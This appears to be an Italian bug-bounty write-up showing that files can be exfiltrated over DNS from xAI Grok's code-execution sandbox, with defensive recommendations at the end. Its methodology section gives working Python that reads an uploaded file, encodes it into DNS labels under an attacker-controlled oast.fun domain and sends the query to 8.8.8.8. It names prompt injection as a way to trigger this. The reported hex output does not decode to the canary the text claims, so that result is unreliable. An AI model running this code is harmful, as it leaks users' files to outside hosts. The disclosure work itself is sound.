# DNS OAST data exfiltration from xAI Grok Code Execution (Hades) sandbox

## Abstract

In questo write-up documento un canale di esfiltrazione out-of-band (OAST) basato su DNS a partire dal code execution tool di Grok (xAI).

Nonostante la documentazione ufficiale dichiari “no external network access, egress blocked by design, limited file I/O” per il sandbox, è possibile:

- leggere file uploadati dall’utente (es. `/home/workdir/attachments/*.txt`),
- costruire query DNS arbitrarie verso domini controllati dall’attaccante,
- inviare tali query a resolver pubblici (es. `8.8.8.8:53`),
- e ricevere risposte valide, dimostrando un canale di rete outbound funzionante.

Il PoC usa solo dati canary controllati dal ricercatore e non accede a credential, token, metadata service o dati di terze parti.

## Contesto e boundary dichiarato

Secondo la documentazione ufficiale xAI per il **Code Execution Tool**:

- il codice gira in un ambiente Python sandboxato,
- con:
  - **nessun accesso a reti esterne**,
  - **egress bloccato by design**,
  - I/O su filesystem limitato e temporaneo / stateless.

In altre parole, il boundary di sicurezza promesso è:

> “No access to external networks or file systems” (o formulazione equivalente: egress bloccato, filesystem limitato).

## Obiettivo del test

Verificare se, partendo da un file uploadato dall’utente e visibile al codice eseguito nel sandbox, sia possibile:

1. leggere il contenuto del file,
2. codificarlo in etichette DNS,
3. inviare una query DNS verso un dominio OAST controllato,
4. e osservare il contenuto del file sul server OAST.

Se il test ha successo, il sandbox viola il boundary dichiarato (“no external network access”) e permette esfiltrazione di dati via DNS.

## Ambiente di test

- Piattaforma: `grok.com` – Code Execution session (Hades sandbox).
- File di test: `XAI_H1_REPLICA2.txt`, uploadato come normale file utente.
- Contenuto canary: `XAI_H1_REPLICA2_CANARY_20260810_1014_6F2C9A`.
- SHA-256 del file (prima e dopo l’upload):  
  `8b390c59380e26e48a2a9f6e4593543432ed6fec42a8514fd6b91eaedfdf83e9`.
- Dominio OAST: dominio Interactsh / `oast.fun` controllato dal ricercatore.

## Metodologia

### 1. Preparazione del canary

- Creazione locale di un file di testo con un valore canary unico.
- Upload del file nella sessione Grok come normale attachment.
- Verifica che il file sia presente in `/home/workdir/attachments/XAI_H1_REPLICA2.txt`.

### 2. Codice di esfiltrazione DNS

All’interno della sessione di code execution viene eseguito uno script Python che:

- legge il file:
  ```python
  with open("/home/workdir/attachments/XAI_H1_REPLICA2.txt", "rb") as f:
      data = f.read().strip()
  ```
- ne codifica il contenuto in hex:
  ```python
  encoded = data.hex()
  ```
- suddivide l’hex in chunk da ≤50 byte per rispettare il limite delle label DNS (63 byte):
  ```python
  chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
  ```
- costruisce un FQDN OAST:
  ```python
  oast = "dnbrkdjfxdiywdejztfatv6x4lncppsqg.oast.fun"
  fqdn = ".".join(chunks + [oast])
  ```
- costruisce manualmente un pacchetto DNS (query A) e lo invia a `8.8.8.8:53` via TCP:
  ```python
  import socket
  import struct
  import random

  def qname(name):
      out = b""
      for label in name.split("."):
          b = label.encode()
          assert len(b) <= 63
          out += bytes([len(b)]) + b
      return out + b"\x00"

  tid = random.randrange(65536)

  packet = (
      struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
      + qname(fqdn)
      + struct.pack("!HH", 1, 1)
  )

  s = socket.create_connection(("8.8.8.8", 53), timeout=5)
  s.sendall(struct.pack("!H", len(packet)) + packet)
  ```
- attende e legge la risposta DNS, verificando che il transaction ID corrisponda.

### 3. Verifica lato OAST

- Il server OAST (Interactsh / proprio server DNS) registra la query ricevuta.
- Il FQDN ricevuto contiene, nelle label, l’hex del contenuto del file.
- Decodificando le label si ottiene esattamente il canary originale.

## Risultati osservati

Output dallo script nel sandbox (estratto):

```text
FILE_CANARY=XAI_H1_REPLICA2_CANARY_20260810_1014_6F2C9A
ENCODED=5841495f48414445535f505249564154455f46494c455f43414e4152595f32303236303831305f313031345f364632433941
OAST_FQDN=5841495f48414445535f505249564154455f46494c455f4341.4e4152595f32303236303831305f313031345f364632433941.dnbrkdjfxdiywdejztfatv6x4lncppsqg.oast.fun
DNS_RESPONSE=YES
TXID_MATCH=YES
RCODE=0
```

Query DNS osservata sul server OAST (estratto):

```text
;; QUESTION SECTION:
;5841495f48414445535f505249564154455f46494c455f4341.4e4152595f32303236303831305f313031345f364632433941.dnbrkdjfxdiywdejztfatv6x4lncppsqg.oast.fun. IN A

;; ANSWER SECTION:
... IN A 206.189.156.69
```

Decodificando le label DNS:

```text
5841495f48414445535f505249564154455f46494c455f4341...
→ XAI_H1_REPLICA2_CANARY_20260810_1014_6F2C9A
```

Il contenuto del file uploadato è quindi **completamente visibile** sul server OAST.

## Analisi del boundary violato

Boundary dichiarato (doc ufficiale):

- “no external network access”
- “egress blocked by design”
- “limited file I/O”

Comportamento osservato:

- lettura di un file persistente in `/home/workdir/attachments/`,
- apertura di socket verso `8.8.8.8:53`,
- invio di query DNS verso domini arbitrari,
- ricezione di risposte DNS valide.

Questo dimostra che:

- il canale di rete outbound (almeno DNS) **non è bloccato** come dichiarato,
- e il filesystem accessibile è più ampio di quanto ci si aspetterebbe da un contesto “limitato e stateless”.

Si tratta quindi di una **violazione del boundary di sicurezza promesso**, non di un uso “entro le regole ma rischioso”.

## Impatto

Un attaccante che possa indurre l’esecuzione di codice nel sandbox (es. tramite prompt injection, generazione di codice da input malevoli, ecc.) può:

- leggere file accessibili al sandbox (inclusi file uploadati dagli utenti),
- codificarne il contenuto in query DNS,
- e trasmetterlo a infrastruttura esterna controllata.

Nel PoC è stato usato solo un canary controllato dal ricercatore, ma il meccanismo è generale e si applica a:

- file contenenti dati sensibili,
- output di comandi,
- listing di directory,
- o qualsiasi altra informazione raggiungibile dal codice nel sandbox.

Questo crea un rischio di **confidenzialità** per i dati gestiti dalla piattaforma.

## Limitazioni del PoC

- Sono stati usati solo file e dati canary controllati dal ricercatore.
- Non sono stati accessi:
  - credential,
  - token,
  - metadata service,
  - né dati di terze parti o di altri utenti.
- Il PoC è stato eseguito in un ambiente di test dedicato.

## Raccomandazioni

Per allineare il comportamento reale al boundary dichiarato (“no external network access”), si raccomanda di:

1. **Bloccare tutto l’egress di rete per il code execution sandbox**  
   - Nessun accesso diretto a internet (DNS incluso).
   - Se serve rete per funzionalità specifiche, usare:
     - proxy controllati,
     - allowlist stretta di domini/IP,
     - e logging completo.

2. **Rafforzare l’isolamento del filesystem**  
   - Limitare l’accesso a directory temporanee effimere.
   - Evitare che file uploadati siano leggibili come path assoluti da codice generico.

3. **Monitoring e detection**  
   - Loggare tutte le connessioni di rete originate dal sandbox (DNS, HTTP, ecc.).
   - Introdurre alert su pattern anomali (es. molte query DNS verso domini sconosciuti).

## Riferimenti

- Documentazione ufficiale xAI – Code Execution Tool (security notes).
- CSA Research Note – AI Sandbox DNS Exfiltration (Bedrock, LangSmith, ecc.).
- Write-up simili su DNS OAST e sandbox AI (HackerOne, blog di sicurezza).

## Autore

Federico Brasili (@Federico1976) – security researcher / bug hunter.
